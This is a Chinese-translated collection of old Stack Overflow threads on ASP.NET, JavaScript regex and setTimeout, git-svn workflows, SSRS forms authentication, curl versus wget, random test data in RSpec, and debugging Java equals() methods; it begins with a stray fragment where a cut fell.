并实际创建了该文件（空）。

# asp.net - SqlDataSource 是否自动转换参数值...？

> ID：636329
> 
> 赞同：0
> 
> 时间：2009-03-11T20:55:54.280
> 
> 标签：asp.net, ado.net

1) ObjectDataSource 不检查所提供参数的类型，而是尝试将参数值转换为匹配参数的数据类型。SqlDatasource 也是如此吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T21:21:05.433

除非您为参数指定[类型](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.parameter.type.aspx)，否则它将被键入为对象

# javascript - Javascript正则表达式去除双引号之间的内容

> ID：636331
> 
> 赞同：2
> 
> 时间：2009-03-11T20:56:36.913
> 
> 标签：javascript, regex

我正在寻找一个 javascript 正则表达式，它将删除包含在引号中的所有内容（以及 qoutes 也是），该字符串是用于列出电子邮件地址的 Outlook 格式。看看下面的示例，我是一个正则表达式，真的需要一些帮助，任何帮助/资源将不胜感激！

```
"Bill'sRestauraunt"BillsRestauraunt@comcast.net,"Rob&amp;Julie"robjules@ntelos.net,"Foo&amp;Bar"foobar@cstone.net 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T21:03:51.013

假设没有嵌套引号：

```
mystring.replace(/"[^"]*"/g, '') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:11:31.713

试试这个正则表达式：

```
/(?:"(?:[^"\\]+|\\(?:\\\\)*.)*"|'(?:[^'\\]+|\\(?:\\\\)*.)*')/g 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:03:29.410

这是我用来查找和分解段落中引用的字符串的正则表达式。它还隔离了几个伴随令牌，尤其是相邻的空白。您可以将所需的任何部分串在一起。

```
var re = new RegExp(/([^\s\(]?)"(\s*)([^\\]*?(\\.[^\\]*)*)(\s*)("|\n\n)([^\s\)\.\,;]?)/g); 
```

# svn - 如何使用 git-svn 跟踪仅本地更改/更改集？

> ID：636332
> 
> 赞同：7
> 
> 时间：2009-03-11T20:56:41.297
> 
> 标签：svn, git, git-svn

我想要在我的本地 git 存储库中跟踪的文件在我运行 git-svn dcommit 时不会签入到中央 svn 存储库。我经常对存储库中跟踪的文件进行长期的仅限本地更改。有时它用于调试代码。我也有想要跟踪的项目 IDE 文件。使用普通的旧 svn，我只需将这些文件放入标有“XYZ：请勿签入”的更改列表中，然后当我确实需要提交更改时手动处理问题。

理想情况下，我想将我的更改检查到我的主分支中，但设置一些东西来防止这些特定更改传播到 svn 存储库。我会以传统方式使用 git 和 git-svn，但某些提交永远不会被推送。显然，我可以在每次提交时手动执行此操作，但这很痛苦。

我考虑并放弃了几件事。我不想排除这些文件，因为有时我需要进行更改才能提交。另外，我希望这些文件出现在我创建的任何本地分支中，就像 IDE 文件一样。但是，我不能将这些更改隔离到单个分支，因为我希望它们出现在每个分支中，就像 IDE 文件一样。看起来像 guilt 或 stgit 之类的东西可能会做我想做的事，但这并不明显，因为它们在 git 之上添加了自己的复杂层，我仍在学习。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T23:56:19.133

我对 git 有点陌生，但我建议在本地 git 存储库中使用单独的主分支和工作分支。

仅将“非 SVN”文件添加到工作分支中。通常在工作分支中进行所有代码更改。当“非SVN”文件发生变化时，使用唯一提交添加那些，并设置提交消息前缀（即“本地：”或“私有：”）。当您准备好提交到 SVN 时：

1.  显示要添加到 SVN 的提交日志：

    ```
    git co working
    git cherry master 
    ```

2.  将所有上游提交添加到主分支，忽略“私有”提交。重复此步骤，直到所有上游提交都在 master 中。

    ```
    git co master
    git cherry-pick <SHA1> 
    ```

3.  将提交推送到 SVN 存储库：

    ```
    git svn rebase
    git svn dcommit 
    ```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-24T19:07:02.697

我目前对该问题的解决方案是使用堆叠的 git (stg) 并将这些本地更改作为单独的补丁进行维护。当我需要 dcommit 到 Subversion 时，我会执行

```
stg pop # naming the patches that should not be commited
stg commit # the rest of the patches to commit
git svn dcommit
stg push # naming the patches that are used locally 
```

将这些作为单独的补丁进行维护的好处是，我可以轻松地使用补丁来修改我的单元测试以测试不同的数据库后端。所以通常我会针对 Oracle 进行测试，但如果我想针对 Derby 进行测试，我会这样做

```
stg push local-mods-derby
ant tests
stg pop 
```

或者如果我想针对 PostgreSQL 进行测试，我运行

```
stg push local-mods-test-postgresql
ant tests
stg pop 
```

这里，“local-mods-derby”和“local-mods-test-postgresql”是补丁名称。

因此，使用 stg 维护单独的工作补丁非常容易。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-27T17:24:23.233

您是否考虑过不在 master 分支工作？

如果您将更改保存在本地 git 分支中，您可以定期将所需的更改合并或挑选到您的 svn 跟踪分支中。切换到跟踪分支，运行 dcommit。然后回到你的本地分支并重新设置它。

如果您希望在多个分支中进行更改，请将它们全部基于同一个分支点。通过变基将该分支保持为主+更改。然后对于所有其他分支，只需从该基础分支重新设置基准即可。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T20:59:48.840

您可能需要考虑为此使用 stash。

```
git-stash - Stash the changes in a dirty working directory away 
```

但是，对于您所描述的内容，它可能功能不足。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T20:42:10.587

我做了一些研究并想出了一个可以做到的可能性：2个git存储库指向同一个目录。环境变量 GIT_DIR 存储本地存储库目录的名称。如果未设置，git 默认为 .git，但它可以是任何东西。

然后我可以做的是在 .git 中有一个存储库，它映射到我的 Subversion 存储库。这是常见的情况。然后我可以在 .localgit 中有另一个存储库。每个存储库都必须配置为忽略另一个存储库管理的文件。这很容易！用于否定模式。

当我对要签入的仅限本地文件进行更改时，我要么更改我的 GIT_DIR 环境变量，要么使用 --git-dir 命令行参数。如果我的排除/忽略设置正确，我就不必担心碰撞。显然有一些开销来保持最新，但我可以编写一个包装脚本，当文件添加到另一个时，将文件添加到一个 repo 的排除。此外，这种开销只在每个文件中发生一次，而不是像多分支建议那样在每次提交时发生。

如果我想让它更简单，我可以使用命名约定，但我也可以在每个单独的文件上这样做，因为本地文件的数量几乎肯定是个位数（否则我做错了什么）。

我看到这种方法的一个缺点是我无法像 SVN 存储库中的文件一样分支、存储和重置仅本地文件。不过，我对这些的修改可能与我的主要编辑是异步的，所以我认为这在实践中不会是一个重大问题。我还可以为那些支持多存储库的函数编写包装器。此外，在管理仅限本地的文件时，我必须更加明确，但几乎任何情况都必须处理这个问题，除非 git 本身内置多个存储库。

# asp.net - 如何配置 SSRS 2005 以使用 ASP.NET 2.0 表单身份验证？

> ID：636336
> 
> 赞同：1
> 
> 时间：2009-03-11T20:57:23.637
> 
> 标签：asp.net, reporting-services, forms-authentication

我有一个面向外部（互联网）的 SQL Server 2005 Reporting Services 实例。我想使用 ASP.NET 2.0 启用表单身份验证。一些网站讨论了如何配置它以使其工作，但没有任何说明导致完整的解决方案。有人有简单易懂且行之有效的指示吗？

我正在使用 Windows Server 2003

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T11:46:03.857

[阅读MSDN - 在 Reporting Services 2005 中配置表单身份验证的最佳实践中的](http://msdn.microsoft.com/en-us/library/bb283249(SQL.90).aspx)“将 Reporting Services 集成到 ASP.NET 应用程序”部分。
您需要在 SSRS 和 ASP.NET 应用程序中更改 Web.config：“...将 Web.config 文件的表单和 machineKey 部分的属性设置为参与共享表单身份验证的所有应用程序的相同值。. 。”

```
<configuration>
  <system.web>
    <authentication mode="Forms" >
      <!-- The name, protection, and path attributes must match 
           exactly in each Web.config file. -->
      <forms loginUrl="login.aspx"
        name=".ASPXFORMSAUTH" 
        protection="All"  
        path="/" 
        timeout="30" />
    </authentication>

    <!-- Validation and decryption keys must exactly match and cannot
         be set to "AutoGenerate". The validation and decryption
         algorithms must also be the same. -->
    <machineKey
      validationKey="C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE" 
      decryptionKey="8A9BE8FD67AF6979E7D20198CFEA50DD3D3799C77AF2B72F" 
      validation="SHA1" />
  </system.web>
</configuration> 
```

有关详细信息，请参阅[MSDN - 跨应用程序的表单身份验证](http://msdn.microsoft.com/en-us/library/eb0zx8fc(VS.80).aspx)。

此外，[为 Microsoft SQL Server 2005 SP2 安装 Reporting Services 示例](http://msftrsprodsamples.codeplex.com/Release/ProjectReleases.aspx?ReleaseId=4043)并查看“FormsAuthentication Sample”

# linux - 哪个更好，curl 还是 wget？

> ID：636339
> 
> 赞同：134
> 
> 时间：2009-03-11T20:57:58.673
> 
> 标签：linux, curl, wget

它们是否相同？某些事情可以只用一个做，而不能用另一个做吗？那些是什么？或者，归根结底，这是一个熟悉的问题？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2009-03-11T21:07:05.967

如果你正在编程，你应该使用 curl。它有一个很好的 api，并且适用于大多数语言。让操作系统运行 wget 是一件很麻烦的事情，如果您有 API 接口，则不应该这样做！

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2013-07-07T16:50:44.607

功能上有一些重叠。虽然[GNU wget](http://www.gnu.org/software/wget/)是一个使用 HTTP/FTP 检索文件的包，但[curl](http://curl.haxx.se/)使用单个 URL 传输数据。正如[MarkusQ](https://stackoverflow.com/users/62970/markusq)共享的链接中所述，wget 可以递归下载 -有关 curl 作者的更多详细信息，请参阅[此比较文章。](http://daniel.haxx.se/docs/curl-vs-wget.html)

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2013-07-07T17:01:21.070

`cURL`用于双向数据传输，而`wget`用于从特定来源非交互式下载文件。功能上有[一些](/q/9409214)重叠，但它们[并不意味着](/q/6371719)做完全相同[的事情](/q/12846933)。

这实际上取决于您要做什么；对于下载文件`wget`等更简单的任务，并且`cURL`具有可比性，但这实际上只是触及了这两种工具的表面。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2009-03-11T21:03:03.747

它们都提供了无穷无尽的选择，其中大部分我从未使用过。但是，我更喜欢 wget，因为它默认保存您提供的 URL 的输出——非常适合下载。Curl 则相反，将输出直接显示到终端（默认情况下）。

# javascript - 传递给 setTimeout 的函数变量不起作用？

> ID：636341
> 
> 赞同：2
> 
> 时间：2009-03-11T20:58:41.480
> 
> 标签：javascript, iphone, html

谁能告诉我为什么这不起作用？

```
function changeBG(element_id){
        document.getElementById(element_id).className= "arrowActive";
        setTimeout("document.getElementById("+element_id+").className= 'arrow'", 300);
} 
```

在萤火虫中，我收到一条错误消息，指出传递给 setTimeout() 的 element_id 未定义。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T21:02:49.067

该变量`element_id`将是一个字符串，因此您的超时代码将如下所示：

```
document.getElementById(myId).className = ... 
```

请注意，myId 应该用引号引起来，但不是。

更好的方法是使用闭包，如下所示：

```
function changeBG(element_id)
{
        var elm = document.getElementById(element_id);
        elm.className = "arrowActive";
        setTimeout(function() { elm.className= 'arrow'; }, 300);
} 
```

[需要注意的是，不建议](https://developer.mozilla.org/En/DOM/window.setTimeout)以字符串形式传递代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:01:34.310

尝试：

```
setTimeout("document.getElementById('" + element_id + "').className= 'arrow'", 300); 
```

请注意，我在您传递给的字符串参数中添加了引号`getElementById`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-11T21:06:40.197

最好的方法是使用闭包

```
function changeBG(element_id)
{
        var elem = document.getElementById(element_id);
        elem.className= "arrowActive";
        setTimeout( function(e)
        {
                return function()
                {
                        e.className = 'arrow';
                }
        }( elem ), 300);
} 
```

# parsing - 为可能的维基百科链接解析文本的工具

> ID：636351
> 
> 赞同：1
> 
> 时间：2009-03-11T21:01:46.947
> 
> 标签：parsing, hyperlink, wikipedia

是否存在可以解析文本并输出该文本的工具，超链接到维基百科条目以获取感兴趣的单词？

例如，我想要一个可以变成这样的工具：

> 排序列表上最流行的搜索算法是二分搜索。

进入：

> [排序列表](http://en.wikipedia.org/wiki/Sorted_list)上 最流行的[搜索算法](http://en.wikipedia.org/wiki/Search_algorithm)是[二分搜索](http://en.wikipedia.org/wiki/Binary_search)。

如果 Wikipedia 有一个 API 可以做到这一点，那就太好了，因为他们最有能力确定什么是“感兴趣的词”。

在我的示例中，我只是将所有直接链接到条目的组合链接，除了 The 和 most。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-14T06:32:13.787

您有两个不同的问题需要在这里解决：

1.  决定哪些词应该被链接
2.  确定是否有合适的条目将这些词链接到

现在，（2）更简单，尽管它也有些问题。Wikipedia 似乎有[一个 API](http://en.wikipedia.org/wiki/Wikipedia:Creating_a_bot#APIs_for_bots)可以让您有效地收集数据，并且它们还允许“屏幕抓取”。但是消歧存在一个问题——有时你可能没有找到你想要的条目。例如，[python](http://en.wikipedia.org/wiki/Python)链接到消歧页面，因为它可以是编程语言、蛇和其他一些东西。

(1) 不过，难度要大得多。您可以采用“简单方法”并尝试查找所有重要名词（甚至是名词/形容词对）的链接。这里的非平凡意味着省略诸如“恶魔，单词，计算机”等单词。但这会导致过多的链接，不方便阅读。真正由您决定文本中有趣的内容，这在很大程度上取决于文本本身。在给专业程序员的文章中，你真的要每次都链接到“搜索算法”吗？但对于初学者来说，也许你会。

最后，我强烈怀疑是否有一个通用工具可以为您解决问题。但是您肯定拥有所有选项，并且可以轻松编写特定需求的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-25T11:29:38.520

微软研究院的 Silviu Cucerzan 解决了这个问题。好吧，不是插入链接的问题，而是确定某段文本中提到了哪些实体的一般问题。幸运的是，他使用 Wikipedia 文章作为他的实体集。他的论文“基于维基百科数据的大规模命名实体消歧”可在他的[网站](http://research.microsoft.com/en-us/people/silviu/default.aspx)上找到。直接链接：[pdf](http://research.microsoft.com/en-us/people/silviu/emnlp07.pdf)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-27T09:16:33.643

有一个工具可以完全满足您的要求。http://wikify.appointment.at/ 这并不完美，但它确实有效。

# ruby - 随机生成测试数据是一种不好的做法吗？

> ID：636353
> 
> 赞同：6
> 
> 时间：2009-03-11T21:02:10.503
> 
> 标签：ruby, testing, rspec, fixtures

自从我开始使用 rspec 以来，我一直对固定装置的概念有疑问。我主要担心的是：

1.  我使用测试来揭示令人惊讶的行为。对于我正在测试的示例，我并不总是足够聪明地列举所有可能的边缘情况。使用硬编码的固定装置似乎是有限的，因为它只用我想象的非常具体的情况来测试我的代码。（诚​​然，我的想象力也限制了我测试的案例。）

2.  我使用测试作为代码文档的一种形式。如果我有硬编码的夹具值，则很难揭示特定测试试图演示的内容。例如：

    ```
    describe Item do
      describe '#most_expensive' do
        it 'should return the most expensive item' do
          Item.most_expensive.price.should == 100
          # OR
          #Item.most_expensive.price.should == Item.find(:expensive).price
          # OR
          #Item.most_expensive.id.should == Item.find(:expensive).id
        end
      end
    end 
    ```

    使用第一种方法不会让读者知道最贵的物品是什么，只是它的价格是 100。这三种方法都要求读者相信灯具`:expensive`是列出的最贵的灯具`fixtures/items.yml`。粗心的程序员可能会通过创建一个`Item`in`before(:all)`或将另一个夹具插入到`fixtures/items.yml`. 如果这是一个大文件，可能需要很长时间才能找出问题所在。

我开始做的一件事是`#generate_random`为我的所有模型添加一个方法。此方法仅在我运行规范时可用。例如：

```
class Item
  def self.generate_random(params={})
    Item.create(
      :name => params[:name] || String.generate_random,
      :price => params[:price] || rand(100)
    )
  end
end 
```

（我如何做到这一点的具体细节实际上更简洁一些。我有一个处理所有模型的生成和清理的类，但这段代码对于我的示例来说已经足够清晰了。）所以在上面的示例中，我可以测试为跟随。对虚心的警告：我的代码严重依赖于使用`before(:all)`：

```
describe Item do
  describe '#most_expensive' do
    before(:all) do
      @items = []
      3.times { @items << Item.generate_random }
      @items << Item.generate_random({:price => 50})
    end

    it 'should return the most expensive item' do
      sorted = @items.sort { |a, b| b.price <=> a.price }
      expensive = Item.most_expensive
      expensive.should be(sorted[0])
      expensive.price.should >= 50      
    end
  end
end 
```

这样，我的测试可以更好地揭示令人惊讶的行为。当我以这种方式生成数据时，我偶尔会偶然发现我的代码没有按预期运行的边缘情况，但如果我只使用固定装置，我就不会发现这种情况。例如，在 的情况下`#most_expensive`，如果我忘记处理多个项目共享最贵价格的特殊情况，我的测试偶尔会在第一次失败`should`。看到 AutoSpec 中的非确定性故障会提示我出了点问题。如果我只使用固定装置，发现这样的错误可能需要更长的时间。

我的测试在代码中演示预期的行为方面也做得更好。我的测试清楚地表明 sorted 是按价格降序排序的项目数组。由于我希望`#most_expensive`等于该数组的第一个元素，因此更明显的是预期的行为`most_expensive`是什么。

那么，这是一种不好的做法吗？我对固定装置的恐惧是非理性的吗？为每个模型写一个`generate_random`方法是不是工作量太大了？或者这行得通吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-03-11T21:15:09.567

我对这个主题或[Jason Baker](https://stackoverflow.com/questions/256065/testing-with-random-inputs-best-practices)提到 的[蒙特卡洛测试](http://en.wikipedia.org/wiki/Monte_Carlo_method)没有人感到惊讶。那是我唯一一次广泛使用随机测试输入。但是，通过为每个测试用例的随机数生成器设置一个恒定的种子，使测试具有可重复性非常重要。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-11T21:11:31.213

我们在我最近的一个项目中考虑了很多。最后，我们确定了两点：

*   测试用例的可重复性至关重要。如果您必须编写随机测试，请准备好对其进行大量记录，因为如果/当它失败时，您将需要确切知道原因。
*   使用随机性作为代码覆盖率的拐杖意味着您要么没有很好的覆盖率，要么您对领域的了解不足以知道什么构成了代表性测试用例。找出哪个是正确的并相应地修复它。

总之，随机性往往比它的价值更麻烦。在扣动扳机之前，请仔细考虑是否要正确使用它。我们最终决定，随机测试用例一般来说是个坏主意，并且要谨慎使用，如果有的话。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-03-12T07:39:19.380

这是对您第二点的回答：

> (2) 我使用测试作为代码文档的一种形式。如果我有硬编码的夹具值，则很难揭示特定测试试图演示的内容。

我同意。理想情况下，规范示例本身应该是可以理解的。使用固定装置是有问题的，因为它将示例的先决条件与其预期结果分开。

正因为如此，许多 RSpec 用户已经完全停止使用固定装置。相反，在规范示例本身中构造所需的对象。

```
describe Item, "#most_expensive" do
  it 'should return the most expensive item' do
    items = [
      Item.create!(:price => 100),
      Item.create!(:price => 50)
    ]

    Item.most_expensive.price.should == 100
  end
end 
```

如果您最终获得了大量用于创建对象的样板代码，您应该查看许多测试对象工厂库中的一些，例如[factory_girl](http://github.com/thoughtbot/factory_girl/)、[Machinist](http://github.com/notahat/machinist/tree/master)或[FixtureReplacement](http://replacefixtures.rubyforge.org/)。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-11T21:16:29.703

已经发布了很多好的信息，但另请参阅：[模糊测试](http://en.wikipedia.org/wiki/Fuzz_testing)。大街上的消息是，微软在他们的很多项目中都使用了这种方法。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-11T21:50:20.810

我的测试经验主要是用 C/Python/Java 编写的简单程序，所以我不确定这是否完全适用，但是每当我有一个可以接受任何类型用户输入的程序时，我总是包含一个测试随机输入数据，或者至少是计算机以不可预测的方式生成的输入数据，因为您永远无法假设用户将输入什么。或者，好吧，你*可以*，但是如果你这样做了，那么一些没有做出这种假设的黑客很可能会发现一个你完全忽略的错误。机器生成的输入是我所知道的将人为偏见完全排除在测试程序之外的最好（唯一？）方法。当然，为了重现失败的测试，您必须在运行测试之前执行一些操作，例如将测试输入保存到文件或打印出来（如果是文本）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-11T21:50:48.017

只要您没有解决*预言机问题*的方法，即根据输入确定软件的预期结果，随机测试就是一种不好的做法。

如果你解决了预言机问题，你可以比简单的随机输入生成更进一步。您可以选择输入分布，以便软件的特定部分得到比简单随机更多的锻炼。

然后，您从随机测试切换到统计测试。

```
if (a > 0)
    // Do Foo
else (if b < 0)
    // Do Bar
else
    // Do Foobar 
```

如果你在范围内随机选择`a`，你有50% 的时间、25% 的时间和25% 的时间锻炼。您可能会发现 in 中的错误多于或中的错误。`b``int``Foo``Bar``Foobar``Foo``Bar``Foobar`

如果你选择`a`这样它在 66.66% 的时间是负的，`Bar`并且`Foobar`比你的第一个分布得到更多的锻炼。事实上，三个分支各有 33.33% 的时间被执行。

当然，如果您观察到的结果与您的预期结果不同，您必须记录所有对重现错误有用的内容。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-12T02:57:36.170

我建议看看机械师：

> **[http://github.com/notahat/machinist/tree/master](http://github.com/notahat/machinist/tree/master)**

机械师会为您生成数据，但它是可重复的，因此每次测试运行都有相同的随机数据。

您可以通过一致地播种随机数生成器来做类似的事情。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-02-13T21:02:11.283

使用随机测试数据是一种极好的实践——硬编码的测试数据只测试您明确想到的情况，而随机数据会清除您可能错误的隐含假设。

我强烈建议为此使用 Factory Girl 和 ffaker。（在任何情况下都不要使用 Rails 固定装置。）

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-11T21:06:19.980

随机生成的测试用例的一个问题是验证答案应该由代码计算，你不能确定它没有错误:)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-03-11T21:08:12.063

您可能还会看到以下主题： [使用随机输入进行测试的最佳实践](https://stackoverflow.com/questions/256065/testing-with-random-inputs-best-practices)。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-03-12T07:53:31.093

此类测试的有效性在很大程度上取决于您使用的随机数生成器的质量以及将 RNG 的输出转换为测试数据的代码的正确程度。

如果 RNG 永远不会产生导致您的代码进入某些极端情况的值，那么您将不会涵盖这种情况。如果您将 RNG 的输出转换为您测试的代码的输入的代码有缺陷，那么即使使用好的生成器，您仍然可能无法达到所有边缘情况。

你将如何测试？

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-03-12T08:13:29.907

测试用例中随机性的问题在于输出是随机的。

测试（尤其是回归测试）背后的想法是检查是否没有任何问题。

如果您发现有问题，您需要从那时起每次都包含该测试，否则您将无法获得一致的测试集。此外，如果您运行一个有效的随机测试，那么您需要包含该测试，因为您可能会破坏代码以使测试失败。

换句话说，如果您有一个使用动态生成的随机数据的测试，我认为这是一个坏主意。但是，如果您使用一组随机数据，然后存储和重用，这可能是一个好主意。这可以采取随机数生成器的一组种子的形式。

生成数据的这种存储使您可以找到对此数据的“正确”响应。

因此，我建议使用随机数据来探索您的系统，但在测试中使用定义的数据（最初可能是随机生成的数据）

# java - 找出导致 equals() 返回 false 的原因

> ID：636360
> 
> 赞同：1
> 
> 时间：2009-03-11T21:03:29.080
> 
> 标签：java, xml, equals, graph-theory

如何找出导致 equals() 返回 false 的原因？

我不是在问一个确定的、永远正确的方法，而是在问一些有助于开发过程的东西。目前我必须进入 equals() 调用（通常是它们的树），直到其中一个为假，然后进入它，令人作呕。

我考虑过使用对象图，将其输出到 xml 并比较两个对象。但是，XMLEncoder 需要默认构造函数，jibx 需要预编译，我的项目中没有使用 x-stream 和 simple api。我不介意将单个类甚至一个包复制到我的测试区域并在那里使用它，但是为此导入整个 jar 是不会发生的。

我还考虑过自己构建一个对象图遍历器，我可能仍然会这样做，但我不想开始处理特殊情况（有序集合、非有序集合、地图......）

知道该怎么做吗？

编辑：我知道添加罐子是正常的做事方式。我知道罐子是可重复使用的单元。但是，为此（在我的项目中）需要的官僚机构并不能证明结果是合理的——我会继续调试并介入。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T23:37:32.423

这可能不是一个完整的图表比较......除非你的 equals 包括每个类中的每个属性......（你可以尝试 == :)）

尝试[hamcrest 匹配器](http://code.google.com/p/hamcrest/)- 您可以将每个匹配器组合在“全部”匹配器中：

```
Matcher<MyClass> matcher = CoreMatchers.allOf(
  HasPropertyWithValue.hasProperty("myField1", getMyField1()),
  HasPropertyWithValue.hasProperty("myField2", getMyField2()));
if (!matcher.matches(obj)){
  System.out.println(matcher.describeFailure(obj));
  return false;
}
return true; 
```

它会说：'期望 myField1 的值为“值”，但为“不同的值”'

当然你可以内联静态工厂。这比使用[apache-commons EqualsBuilder](http://commons.apache.org/lang/api/org/apache/commons/lang/builder/EqualsBuilder.html)要重一些，但它确实可以准确地描述失败的原因。

您可以创建自己的专用匹配器来快速创建这些表达式。在这里复制[apache-commons EqualsBuilder](http://commons.apache.org/lang/api/org/apache/commons/lang/builder/EqualsBuilder.html)是明智的。

顺便说一句，hamcrest 基本 jar 为 32K（包括源代码！），您可以选择查看代码并向您的老板说“我会坚持将其作为我自己的代码”（我认为这是您的导入问题）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-04T16:24:10.940

您可以使用方面在对象图中的类上修补“相等”，并使它们在返回 false 时将对象状态记录到文件中。要记录对象状态，您可以使用 beanutils 之类的东西来检查对象并转储它。这是一种基于 jar 的解决方案，可以在您的工作空间中轻松使用

如果存储在树中的对象的层次结构足够简单，则可以在类“equal”实现上放置条件断点，仅在“equal”返回 false 时触发，这将限制您必须进入的次数...您可以在具有调试器访问权限的任何地方使用它。eclipse 处理得很好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-11T21:06:50.040

听起来您想要[java-diff](http://www.incava.org/projects/java/java-diff/)或类似的东西。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-10T08:18:55.473

好吧，这是一个完全奇怪的看待它的方式，但是引入一个新的静态方法怎么样：

```
public static boolean breakableEquals(Object o1, Object o2)
{
    if (o1 == o2)
    {
        return true;
    }
    if (o1 == null || o2 == null)
    {
        return false;
    }
    // Don't condense this code!
    if (o1.equals(o2))
    {
        return true;
    }
    else
    {
        return false;
    }
} 
```

我知道，最后一点看起来很疯狂......但不同的是你可以在“return false”上设置断点。如果您随后`breakableEquals`在所有深度相等比较中使用，那么您可以在点击第一个“ `return false`”时立即中断。

诚然，如果您要比较许多原始值，这无济于事……但这可能会有所帮助。我不能说我曾经实际使用过这个，但我不明白为什么它不起作用。当然，它的效率会稍低一些——因此，如果您正在处理高性能代码，您可能希望事后对其进行更改。

另一种选择是使用类似的东西：

```
boolean result = // comparison;
return result; 
```

假设您的 IDE 支持它们，那么您可以在 return 语句上放置一个条件断点，并将条件设置为“ `!result`”。

还有一个选择：

```
public static boolean noOp(boolean result)
{
    return result;
} 
```

然后，您可以在比较中使用它：

```
return Helpers.noOp(x.id == y.id) &&
       Helpers.noOp(x.age == y.age); 
```

我希望当您不调试时，这会被 JIT 优化掉——但同样，您可以在`noOp`. 不幸的是，它使代码更丑陋。

简而言之：这里没有特别吸引人的解决方案，而只是一些在某些情况下*可能会有所帮助的想法。*

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-11T23:54:44.707

> 我不介意将单个类甚至一个包复制到我的测试区域并在那里使用它，但是为此导入整个 jar 是不会发生的。

嗯什么？将 jar 添加到类路径（如果有的话）比复制类或整个包作为源代码更容易且对项目的干扰更少。

至于您的具体问题，您是否有很多不同的类使用许多不同的属性来确定相等性，或者您只是具有本质上相同类的深层嵌套对象图？在后一种情况下，很容易构建 equals() 方法，以便您可以在“return false”语句上放置断点。我想，在前一种情况下，这可能工作量太大了。但是，基于 XML 的比较也可能不起作用，因为它会显示语义相同的对象（例如 Set 和 Map）之间的差异。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-05-07T16:08:42.730

鉴于您的项目无法添加 jar，它似乎远远超出了 SO 的答案，以提供其他项目需要大量代码才能完成的解决方案的完整实现（并且很好地包含在您的 Jar 中）。

非代码解决方案如何——调试器中的条件断点？您可以添加仅在方法返回 false 时触发的断点，并将它们放在所有相关类上。没有踩踏。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-03T10:26:38.390

> 我知道添加罐子是做事的正常方式。我知道罐子是可重复使用的单元。但是，为此（在我的项目中）需要的官僚机构并不能证明结果是合理的——我会继续调试并介入。

解决这个问题的一种方法是包含一个像 Spring 这样的库（它会拉入其他 jar 的负载）我已经看到 Spring 项目实际上并没有使用任何 Spring jar，只是这样他们就可以使用与其捆绑的任何 jar。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-05-06T20:41:16.077

[commons-jxpath](http://commons.apache.org/jxpath/)可能有助于快速检查对象树。我不完全理解包含 jars 的问题，但您可以在您自己的项目中使用它，在您使用的任何 IDE 中，大概可以让您在调试期间使用表达式。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-05-07T00:31:44.993

也许[这篇](http://www.geocities.com/mcphailmj/Trace/)关于方法跟踪的文章会对你有所帮助。

> 这个怎么运作
> 
> 自定义类加载器读取类文件并使用跟踪代码检测每个方法。类加载器还为每个类添加了一个静态字段。该字段有两种状态，“开”和“关”。跟踪代码在打印之前检查此字段。命令行选项访问和修改此静态字段以控制跟踪输出。

他们显示的示例输出看起来很有希望解决您的问题，因为它显示了某些方法（如 isApplet）的返回值：

> isApplet=false

您应该很容易发现在 equals 中开始返回 false 的确切类。这是页面的完整示例输出：

> % java -jar /home/mike/java/trace.jar -classpath "/home/mike/jdk1.3/demo/jfc/SwingSet2/SwingSet2.jar" -排除 CodeViewer SwingSet2
> |SwingSet2.()
> |SwingSet2。
> |SwingSet2.main([Ljava.lang.String;@1dd95c)
> ||isApplet(SwingSet2@3d12a6)
> ||isApplet=false
> ||SwingSet2.createFrame(apple.awt.CGraphicsConfig@93537d)
> ||SwingSet2.createFrame=javax. swing.JFrame@cb01e3
> ||createSplashScreen(SwingSet2@3d12a6)
> |||createImageIcon(SwingSet2@3d12a6, "Splash.jpg", "Splash.accessible_description")
> |||createImageIcon=javax.swing.ImageIcon@393e97
> |||isApplet (SwingSet2@3d12a6)
> |||isApplet=false
